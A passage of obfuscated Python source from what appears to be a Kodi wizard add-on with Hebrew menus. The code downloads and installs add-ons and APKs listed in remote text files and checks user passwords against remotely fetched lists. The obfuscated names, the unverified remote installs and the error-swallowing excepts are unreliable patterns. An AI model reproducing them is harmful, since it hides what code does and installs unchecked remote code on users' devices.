					O000000O0O0OOO00O ,OOO0OOOO0O00OO0OO =OO00OO0O000O0OO0O [2 ].split ('_')#line:2766
				else :#line:2767
					O000000O0O0OOO00O =OO00OO0O000O0OO0O [2 ]#line:2768
					OOO0OOOO0O00OO0OO =''#line:2769
				O00O0O000000OO00O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OO0O000O0OO0O [0 ].title (),OO00OO0O000O0OO0O [1 ],OOO0OOOO0O00OO0OO .upper (),O000000O0O0OOO00O ,COLOR2 ,OO0OO000OO0O00O00 .replace (' ',''),COLOR1 ,OOOOO0OOOOO000O0O )#line:2770
				O0OO0OOO0O000O0OO =urljoin (OOOOOOOOO0O0OO0OO ,O0OO00000000000O0 )#line:2771
				addFile (O00O0O000000OO00O ,'apkinstall',"%s v%s%s %s"%(OO00OO0O000O0OO0O [0 ].title (),OO00OO0O000O0OO0O [1 ],OOO0OOOO0O00OO0OO .upper (),O000000O0O0OOO00O ),O0OO0OOO0O000O0OO )#line:2772
				OO0OO000O0O000O0O +=1 #line:2773
			except :#line:2774
				wiz .log ("Error on: %s"%name )#line:2775
		for O0OO00000000000O0 ,name ,OO0OO000OO0O00O00 ,OOOOO0OOOOO000O0O in OO0O00OO00O00000O :#line:2777
			if O0OO00000000000O0 in ['../','old/']:continue #line:2778
			if not O0OO00000000000O0 .endswith ('.apk'):continue #line:2779
			if not O0OO00000000000O0 .find ('_')==-1 :continue #line:2780
			try :#line:2781
				OO00OO0O000O0OO0O =name .split ('-')#line:2782
				O00O0O000000OO00O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00OO0O000O0OO0O [0 ].title (),OO00OO0O000O0OO0O [1 ],OO00OO0O000O0OO0O [2 ],COLOR2 ,OO0OO000OO0O00O00 .replace (' ',''),COLOR1 ,OOOOO0OOOOO000O0O )#line:2783
				O0OO0OOO0O000O0OO =urljoin (O0OOO00000OOO00O0 ,O0OO00000000000O0 )#line:2784
				addFile (O00O0O000000OO00O ,'apkinstall',"%s v%s %s"%(OO00OO0O000O0OO0O [0 ].title (),OO00OO0O000O0OO0O [1 ],OO00OO0O000O0OO0O [2 ]),O0OO0OOO0O000O0OO )#line:2785
				OO0OO000O0O000O0O +=1 #line:2786
			except :#line:2787
				wiz .log ("Error on: %s"%name )#line:2788
		if OO0OO000O0O000O0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2789
	elif name =='spmc':#line:2790
		OOO00OOO00O0OO00O ='https://github.com/koying/SPMC/releases'#line:2791
		OO0O00O0O0O000O0O =wiz .openURL (OOO00OOO00O0OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2792
		OO0OO000O0O000O0O =0 #line:2793
		OO00OOOOO00000OOO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO0O00O0O0O000O0O )#line:2794
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2796
		for name ,OOOOO00O00000OO0O in OO00OOOOO00000OOO :#line:2798
			OO000O0000OO00OOO =''#line:2799
			OO0O00OO00O00000O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOOO00O00000OO0O )#line:2800
			for O0O00O0O0OOO00000 ,O00OO0000O0000OOO ,O0O000OOOOO000000 in OO0O00OO00O00000O :#line:2801
				if O0O000OOOOO000000 .find ('armeabi')==-1 :continue #line:2802
				if O0O000OOOOO000000 .find ('launcher')>-1 :continue #line:2803
				OO000O0000OO00OOO =urljoin ('https://github.com',O0O00O0O0OOO00000 )#line:2804
				break #line:2805
		if OO0OO000O0O000O0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2807
def apkMenu (url =None ):#line:2809
	if url ==None :#line:2810
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2813
	if not APKFILE =='http://':#line:2814
		if url ==None :#line:2815
			O00OOO0O0O0O0O0OO =wiz .workingURL (APKFILE )#line:2816
			OO0000OOOO0O000OO =uservar .APKFILE #line:2817
		else :#line:2818
			O00OOO0O0O0O0O0OO =wiz .workingURL (url )#line:2819
			OO0000OOOO0O000OO =url #line:2820
		if O00OOO0O0O0O0O0OO ==True :#line:2821
			O000O0O0O0OOOO0OO =wiz .openURL (OO0000OOOO0O000OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2822
			O0000O000O0000OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000O0O0O0OOOO0OO )#line:2823
			if len (O0000O000O0000OOO )>0 :#line:2824
				OO0OOO0O0O000000O =0 #line:2825
				for O0O00OO0OOOO0000O ,O0OOO0OO0OOO0O000 ,url ,OOOOOOOOOOO00OO00 ,OO000O0O0OOO0OO00 ,O00OO0OOO0OOO00OO ,O0O000O0O0OO0O000 in O0000O000O0000OOO :#line:2826
					if not SHOWADULT =='true'and O00OO0OOO0OOO00OO .lower ()=='yes':continue #line:2827
					if O0OOO0OO0OOO0O000 .lower ()=='yes':#line:2828
						OO0OOO0O0O000000O +=1 #line:2829
						addDir ("[B]%s[/B]"%O0O00OO0OOOO0000O ,'apk',url ,description =O0O000O0O0OO0O000 ,icon =OOOOOOOOOOO00OO00 ,fanart =OO000O0O0OOO0OO00 ,themeit =THEME3 )#line:2830
					else :#line:2831
						OO0OOO0O0O000000O +=1 #line:2832
						addFile (O0O00OO0OOOO0000O ,'apkinstall',O0O00OO0OOOO0000O ,url ,description =O0O000O0O0OO0O000 ,icon =OOOOOOOOOOO00OO00 ,fanart =OO000O0O0OOO0OO00 ,themeit =THEME2 )#line:2833
					if OO0OOO0O0O000000O <1 :#line:2834
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2835
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2836
		else :#line:2837
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2838
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2839
			addFile ('%s'%O00OOO0O0O0O0O0OO ,'',themeit =THEME3 )#line:2840
		return #line:2841
	else :wiz .log ("[APK Menu] No APK list added.")#line:2842
	setView ('files','viewType')#line:2843
def addonMenu (url =None ):#line:2845
	if not ADDONFILE =='http://':#line:2846
		if url ==None :#line:2847
			O0OOO0000O00O0OOO =wiz .workingURL (ADDONFILE )#line:2848
			OO0000O0O00OOO0O0 =uservar .ADDONFILE #line:2849
		else :#line:2850
			O0OOO0000O00O0OOO =wiz .workingURL (url )#line:2851
			OO0000O0O00OOO0O0 =url #line:2852
		if O0OOO0000O00O0OOO ==True :#line:2853
			OO00O0OOO0OOOOO0O =wiz .openURL (OO0000O0O00OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2854
			O00000000OOO000OO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O0OOO0OOOOO0O )#line:2855
			if len (O00000000OOO000OO )>0 :#line:2856
				O00OO00OOOO00OO00 =0 #line:2857
				for O00O0OOO00000OOOO ,O00O000OO000OOOOO ,url ,O0OO0OO0O00O0OOOO ,O0OO00OOOOOO00OOO ,O0OO0OO0OO0OO0O0O ,O0000O00OO00000OO ,OO0O000OOO0O000O0 ,OOO0O0O0O00OO00OO ,O00000O00O0OO0000 in O00000000OOO000OO :#line:2858
					if O00O000OO000OOOOO .lower ()=='section':#line:2859
						O00OO00OOOO00OO00 +=1 #line:2860
						addDir ("[B]%s[/B]"%O00O0OOO00000OOOO ,'addons',url ,description =O00000O00O0OO0000 ,icon =O0000O00OO00000OO ,fanart =OO0O000OOO0O000O0 ,themeit =THEME3 )#line:2861
					else :#line:2862
						if not SHOWADULT =='true'and OOO0O0O0O00OO00OO .lower ()=='yes':continue #line:2863
						try :#line:2864
							O00O0OOO000O0000O =xbmcaddon .Addon (id =O00O000OO000OOOOO ).getAddonInfo ('path')#line:2865
							if os .path .exists (O00O0OOO000O0000O ):#line:2866
								O00O0OOO00000OOOO ="[COLOR green][Installed][/COLOR] %s"%O00O0OOO00000OOOO #line:2867
						except :#line:2868
							pass #line:2869
						O00OO00OOOO00OO00 +=1 #line:2870
						addFile (O00O0OOO00000OOOO ,'addoninstall',O00O000OO000OOOOO ,OO0000O0O00OOO0O0 ,description =O00000O00O0OO0000 ,icon =O0000O00OO00000OO ,fanart =OO0O000OOO0O000O0 ,themeit =THEME2 )#line:2871
					if O00OO00OOOO00OO00 <1 :#line:2872
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2873
			else :#line:2874
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2875
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2876
		else :#line:2877
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2878
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2879
			addFile ('%s'%O0OOO0000O00O0OOO ,'',themeit =THEME3 )#line:2880
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2881
	setView ('files','viewType')#line:2882
def addonInstaller (OOO00000000O00OO0 ,O00O0000OOO0O00O0 ):#line:2884
	if not ADDONFILE =='http://':#line:2885
		OOOOOOO0O0000O0O0 =wiz .workingURL (O00O0000OOO0O00O0 )#line:2886
		if OOOOOOO0O0000O0O0 ==True :#line:2887
			O00O0O000O0O00O00 =wiz .openURL (O00O0000OOO0O00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2888
			OOOO00OO00O00OOOO =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO00000000O00OO0 ).findall (O00O0O000O0O00O00 )#line:2889
			if len (OOOO00OO00O00OOOO )>0 :#line:2890
				for O0O0OO0O00OO0OOOO ,O00O0000OOO0O00O0 ,OOO00OO00OO000000 ,OOO000OOOO00O0O00 ,OO0OO00O0OOOOOOO0 ,O00O0O00OOOO0OO00 ,OOOO0O000OO0OO0O0 ,OOO0OOOOOO000O0O0 ,OOOO0O0OOO0OOO00O in OOOO00OO00O00OOOO :#line:2891
					if os .path .exists (os .path .join (ADDONS ,OOO00000000O00OO0 )):#line:2892
						OO000O00OOO00O00O =['Launch Addon','Remove Addon']#line:2893
						OO0OO00OO00OO0O00 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO000O00OOO00O00O )#line:2894
						if OO0OO00OO00OO0O00 ==0 :#line:2895
							wiz .ebi ('RunAddon(%s)'%OOO00000000O00OO0 )#line:2896
							xbmc .sleep (1000 )#line:2897
							return True #line:2898
						elif OO0OO00OO00OO0O00 ==1 :#line:2899
							wiz .cleanHouse (os .path .join (ADDONS ,OOO00000000O00OO0 ))#line:2900
							try :wiz .removeFolder (os .path .join (ADDONS ,OOO00000000O00OO0 ))#line:2901
							except :pass #line:2902
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO00000000O00OO0 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2903
								removeAddonData (OOO00000000O00OO0 )#line:2904
							wiz .refresh ()#line:2905
							return True #line:2906
						else :#line:2907
							return False #line:2908
					OO000OO00OO000000 =os .path .join (ADDONS ,OOO00OO00OO000000 )#line:2909
					if not OOO00OO00OO000000 .lower ()=='none'and not os .path .exists (OO000OO00OO000000 ):#line:2910
						wiz .log ("Repository not installed, installing it")#line:2911
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOO00000000O00OO0 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOO00OO00OO000000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2912
							O0OO0000O000O00O0 =wiz .parseDOM (wiz .openURL (OOO000OOOO00O0O00 ),'addon',ret ='version',attrs ={'id':OOO00OO00OO000000 })#line:2913
							if len (O0OO0000O000O00O0 )>0 :#line:2914
								OOO00OOOO0O0O0OOO ='%s%s-%s.zip'%(OO0OO00O0OOOOOOO0 ,OOO00OO00OO000000 ,O0OO0000O000O00O0 [0 ])#line:2915
								wiz .log (OOO00OOOO0O0O0OOO )#line:2916
								if KODIV >=17 :wiz .addonDatabase (OOO00OO00OO000000 ,1 )#line:2917
								installAddon (OOO00OO00OO000000 ,OOO00OOOO0O0O0OOO )#line:2918
								wiz .ebi ('UpdateAddonRepos()')#line:2919
								wiz .log ("Installing Addon from Kodi")#line:2921
								O0OOOO00OO0O0O0OO =installFromKodi (OOO00000000O00OO0 )#line:2922
								wiz .log ("Install from Kodi: %s"%O0OOOO00OO0O0O0OO )#line:2923
								if O0OOOO00OO0O0O0OO :#line:2924
									wiz .refresh ()#line:2925
									return True #line:2926
							else :#line:2927
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OOO00OO00OO000000 )#line:2928
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOO00000000O00OO0 ,OOO00OO00OO000000 ))#line:2929
					elif OOO00OO00OO000000 .lower ()=='none':#line:2930
						wiz .log ("No repository, installing addon")#line:2931
						O00OO000OO000O000 =OOO00000000O00OO0 #line:2932
						OOOO0O0OOO0O0OO0O =O00O0000OOO0O00O0 #line:2933
						installAddon (OOO00000000O00OO0 ,O00O0000OOO0O00O0 )#line:2934
						wiz .refresh ()#line:2935
						return True #line:2936
					else :#line:2937
						wiz .log ("Repository installed, installing addon")#line:2938
						O0OOOO00OO0O0O0OO =installFromKodi (OOO00000000O00OO0 ,False )#line:2939
						if O0OOOO00OO0O0O0OO :#line:2940
							wiz .refresh ()#line:2941
							return True #line:2942
					if os .path .exists (os .path .join (ADDONS ,OOO00000000O00OO0 )):return True #line:2943
					OO0OO00OOO0O0OO00 =wiz .parseDOM (wiz .openURL (OOO000OOOO00O0O00 ),'addon',ret ='version',attrs ={'id':OOO00000000O00OO0 })#line:2944
					if len (OO0OO00OOO0O0OO00 )>0 :#line:2945
						O00O0000OOO0O00O0 ="%s%s-%s.zip"%(O00O0000OOO0O00O0 ,OOO00000000O00OO0 ,OO0OO00OOO0O0OO00 [0 ])#line:2946
						wiz .log (str (O00O0000OOO0O00O0 ))#line:2947
						if KODIV >=17 :wiz .addonDatabase (OOO00000000O00OO0 ,1 )#line:2948
						installAddon (OOO00000000O00OO0 ,O00O0000OOO0O00O0 )#line:2949
						wiz .refresh ()#line:2950
					else :#line:2951
						wiz .log ("no match");return False #line:2952
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2953
		else :wiz .log ("[Addon Installer] Text File: %s"%OOOOOOO0O0000O0O0 )#line:2954
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2955
def installFromKodi (O0O0OOOOOOO0O0OOO ,over =True ):#line:2957
	if over ==True :#line:2958
		xbmc .sleep (2000 )#line:2959
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0OOOOOOO0O0OOO )#line:2961
	if not wiz .whileWindow ('yesnodialog'):#line:2962
		return False #line:2963
	xbmc .sleep (1000 )#line:2964
	if wiz .whileWindow ('okdialog'):#line:2965
		return False #line:2966
	wiz .whileWindow ('progressdialog')#line:2967
	if os .path .exists (os .path .join (ADDONS ,O0O0OOOOOOO0O0OOO )):return True #line:2968
	else :return False #line:2969
def installAddon (O0OO0O000OO0OOO0O ,O0O00OOO0O000O0O0 ):#line:2971
	if not wiz .workingURL (O0O00OOO0O000O0O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0O000OO0OOO0O ,COLOR2 ));return #line:2972
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2973
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O000OO0OOO0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2974
	OOO00O0O0OO000000 =O0O00OOO0O000O0O0 .split ('/')#line:2975
	O000O0O00OOO00OOO =os .path .join (PACKAGES ,OOO00O0O0OO000000 [-1 ])#line:2976
	try :os .remove (O000O0O00OOO00OOO )#line:2977
	except :pass #line:2978
	downloader .download (O0O00OOO0O000O0O0 ,O000O0O00OOO00OOO ,DP )#line:2979
	O00OOO00000O00OOO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0O000OO0OOO0O )#line:2980
	DP .update (0 ,O00OOO00000O00OOO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2981
	OOOO0O0OOOO000OO0 ,O000OO0OOOOOOO0O0 ,O00OOOOO0O0OO000O =extract .all (O000O0O00OOO00OOO ,ADDONS ,DP ,title =O00OOO00000O00OOO )#line:2982
	DP .update (0 ,O00OOO00000O00OOO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2983
	installed (O0OO0O000OO0OOO0O )#line:2984
	installDep (O0OO0O000OO0OOO0O ,DP )#line:2985
	DP .close ()#line:2986
	wiz .ebi ('UpdateAddonRepos()')#line:2987
	wiz .ebi ('UpdateLocalAddons()')#line:2988
	wiz .refresh ()#line:2989
def installDep (O0O0000O000OO0O0O ,DP =None ):#line:2991
	OOOOOO00OO0OOOOOO =os .path .join (ADDONS ,O0O0000O000OO0O0O ,'addon.xml')#line:2992
	if os .path .exists (OOOOOO00OO0OOOOOO ):#line:2993
		O0O00OO0OOOOOOOOO =open (OOOOOO00OO0OOOOOO ,mode ='r');O0O00O00O0OOOO00O =O0O00OO0OOOOOOOOO .read ();O0O00OO0OOOOOOOOO .close ();#line:2994
		OO0OOOOOO0O00OOO0 =wiz .parseDOM (O0O00O00O0OOOO00O ,'import',ret ='addon')#line:2995
		for OO00O0000O0O00O00 in OO0OOOOOO0O00OOO0 :#line:2996
			if not 'xbmc.python'in OO00O0000O0O00O00 :#line:2997
				if not DP ==None :#line:2998
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0000O0O00O00 ))#line:2999
				wiz .createTemp (OO00O0000O0O00O00 )#line:3000
def installed (OOOO0O0O0O000000O ):#line:3027
	O0O0O0000OO0OOO0O =os .path .join (ADDONS ,OOOO0O0O0O000000O ,'addon.xml')#line:3028
	if os .path .exists (O0O0O0000OO0OOO0O ):#line:3029
		try :#line:3030
			O00OOOO00O0OOO0OO =open (O0O0O0000OO0OOO0O ,mode ='r');OO0OO0OO0OO00000O =O00OOOO00O0OOO0OO .read ();O00OOOO00O0OOO0OO .close ()#line:3031
			OO00O0OOO0OO0OO00 =wiz .parseDOM (OO0OO0OO0OO00000O ,'addon',ret ='name',attrs ={'id':OOOO0O0O0O000000O })#line:3032
			O000OO000OO00000O =os .path .join (ADDONS ,OOOO0O0O0O000000O ,'icon.png')#line:3033
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00O0OOO0OO0OO00 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O000OO000OO00000O )#line:3034
		except :pass #line:3035
def youtubeMenu (url =None ):#line:3037
	if not YOUTUBEFILE =='http://':#line:3038
		if url ==None :#line:3039
			O00O00OO0O00OO0O0 =wiz .workingURL (YOUTUBEFILE )#line:3040
			O0O0OO0OOOO00O00O =uservar .YOUTUBEFILE #line:3041
		else :#line:3042
			O00O00OO0O00OO0O0 =wiz .workingURL (url )#line:3043
			O0O0OO0OOOO00O00O =url #line:3044
		if O00O00OO0O00OO0O0 ==True :#line:3045
			O0O0OOO0O00O0O00O =wiz .openURL (O0O0OO0OOOO00O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3046
			O00OOOO00O0O0OO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOO0O00O0O00O )#line:3047
			if len (O00OOOO00O0O0OO00 )>0 :#line:3048
				for O00O0O0O000000OO0 ,OOOOOOOOO0O0O0OO0 ,url ,O0O0OOO0OOOOO00O0 ,O0O0OOO00000OOO00 ,O0O0OO0O0OOO00OOO in O00OOOO00O0O0OO00 :#line:3049
					if OOOOOOOOO0O0O0OO0 .lower ()=="yes":#line:3050
						addDir ("[B]%s[/B]"%O00O0O0O000000OO0 ,'youtube',url ,description =O0O0OO0O0OOO00OOO ,icon =O0O0OOO0OOOOO00O0 ,fanart =O0O0OOO00000OOO00 ,themeit =THEME3 )#line:3051
					else :#line:3052
						addFile (O00O0O0O000000OO0 ,'viewVideo',url =url ,description =O0O0OO0O0OOO00OOO ,icon =O0O0OOO0OOOOO00O0 ,fanart =O0O0OOO00000OOO00 ,themeit =THEME2 )#line:3053
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3054
		else :#line:3055
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3056
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3057
			addFile ('%s'%O00O00OO0O00OO0O0 ,'',themeit =THEME3 )#line:3058
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3059
	setView ('files','viewType')#line:3060
def STARTP ():#line:3061
	O0O0O00000O0O0O00 =(ADDON .getSetting ("pass"))#line:3062
	if BUILDNAME =="":#line:3063
	 if not NOTIFY =='true':#line:3064
          O00000OO000O0OOO0 =wiz .workingURL (NOTIFICATION )#line:3065
	 if not NOTIFY2 =='true':#line:3066
          O00000OO000O0OOO0 =wiz .workingURL (NOTIFICATION2 )#line:3067
	 if not NOTIFY3 =='true':#line:3068
          O00000OO000O0OOO0 =wiz .workingURL (NOTIFICATION3 )#line:3069
	O0000O0O0OOO00000 =O0O0O00000O0O0O00 #line:3070
	O00000OO000O0OOO0 =urllib2 .Request (SPEED )#line:3071
	O0O0OOOO0OOO00O0O =urllib2 .urlopen (O00000OO000O0OOO0 )#line:3072
	OOOO000O00O0OOOOO =O0O0OOOO0OOO00O0O .readlines ()#line:3074
	O0OOO0OOO000O0O00 =0 #line:3078
	for O0OO0OOO000OO000O in OOOO000O00O0OOOOO :#line:3079
		if O0OO0OOO000OO000O .split (' ==')[0 ]==O0O0O00000O0O0O00 or O0OO0OOO000OO000O .split ()[0 ]==O0O0O00000O0O0O00 :#line:3080
			O0OOO0OOO000O0O00 =1 #line:3081
			break #line:3082
	if O0OOO0OOO000O0O00 ==0 :#line:3083
					OOO000O000O0O0OO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3084
					if OOO000O000O0O0OO0 :#line:3086
						ADDON .openSettings ()#line:3088
						sys .exit ()#line:3090
					else :#line:3091
						sys .exit ()#line:3092
	return 'ok'#line:3096
def STARTP2 ():#line:3097
	OOO0O0O0OO0OOOOOO =(ADDON .getSetting ("user"))#line:3098
	O000O00O0O00000O0 =(UNAME )#line:3100
	O0O00OOO000O000OO =urllib2 .urlopen (O000O00O0O00000O0 )#line:3101
	OO00OO0OOO000000O =O0O00OOO000O000OO .readlines ()#line:3102
	O00OO0O0OO0OOO0O0 =0 #line:3103
	for OOOOOO0OOO000O000 in OO00OO0OOO000000O :#line:3106
		if OOOOOO0OOO000O000 .split (' ==')[0 ]==OOO0O0O0OO0OOOOOO or OOOOOO0OOO000O000 .split ()[0 ]==OOO0O0O0OO0OOOOOO :#line:3107
			O00OO0O0OO0OOO0O0 =1 #line:3108
			break #line:3109
	if O00OO0O0OO0OOO0O0 ==0 :#line:3110
		OOO0000OOO00OOO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3111
		if OOO0000OOO00OOO00 :#line:3113
			ADDON .openSettings ()#line:3115
			sys .exit ()#line:3118
		else :#line:3119
			sys .exit ()#line:3120
	return 'ok'#line:3124
def passandpin ():#line:3125
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3126
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3127
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3128
def passandUsername ():#line:3129
	ADDON .openSettings ()#line:3131
def folderback ():#line:3134
    O0OO0000O000OO000 =ADDON .getSetting ("path")#line:3135
    if O0OO0000O000OO000 :#line:3136
      O0OO0000O000OO000 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3137
      ADDON .setSetting ("path",O0OO0000O000OO000 )#line:3138
def backmyupbuild ():#line:3141
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3145
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3146
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3147
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3149
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3150
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3151
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3153
def maintMenu (view =None ):#line:3157
	OO0000OOOO00OOO00 ='[B][COLOR green]ON[/COLOR][/B]';O0OOO00OO00000OOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:3159
	O0O0OO0O0OOO0OO00 ='true'if AUTOCLEANUP =='true'else 'false'#line:3160
	O0O000OOOO0OOO0O0 ='true'if AUTOCACHE =='true'else 'false'#line:3161
	OO0O000OOO0OO00OO ='true'if AUTOPACKAGES =='true'else 'false'#line:3162
	O0O0O000OOOOOO000 ='true'if AUTOTHUMBS =='true'else 'false'#line:3163
	OOO0000000O0000O0 ='true'if SHOWMAINT =='true'else 'false'#line:3164
	O00O00OOO00O0OOO0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:3165
	OO000OOOOOOOO0000 ='true'if INCLUDEALL =='true'else 'false'#line:3166
	OO00OOOO000O0O0OO ='true'if THIRDPARTY =='true'else 'false'#line:3167
	if wiz .Grab_Log (True )==False :OOOO000OO0OOO0OO0 =0 #line:3168
	else :OOOO000OO0OOO0OO0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3169
	if wiz .Grab_Log (True ,True )==False :O00O0O0OO0OO0O00O =0 #line:3170
	else :O00O0O0OO0OO0O00O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3171
	OO0OO00OOO0OOOOO0 =int (OOOO000OO0OOO0OO0 )+int (O00O0O0OO0OO0O00O )#line:3172
	OO00OO00O00O0OO0O =str (OO0OO00OOO0OOOOO0 )+' Error(s) Found'if OO0OO00OOO0OOOOO0 >0 else 'None Found'#line:3173
	OO0O0OO0OO0O00O0O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3174
	if OO000OOOOOOOO0000 =='true':#line:3175
		O0OO00OOO000O00O0 ='true'#line:3176
		OO0OO0OO0OO0OO0OO ='true'#line:3177
		O000O00O0OO0OOO0O ='true'#line:3178
		OO0OO0000000O0000 ='true'#line:3179
		O0OOO0O0OOOO0OO0O ='true'#line:3180
		OOOOO0O00O000OO0O ='true'#line:3181
		OO0O000O00OOOO0O0 ='true'#line:3182
		OOOOO0OO0OOOOO0O0 ='true'#line:3183
	else :#line:3184
		O0OO00OOO000O00O0 ='true'if INCLUDEBOB =='true'else 'false'#line:3185
		OO0OO0OO0OO0OO0OO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3186
		O000O00O0OO0OOO0O ='true'if INCLUDESPECTO =='true'else 'false'#line:3187
		OO0OO0000000O0000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:3188
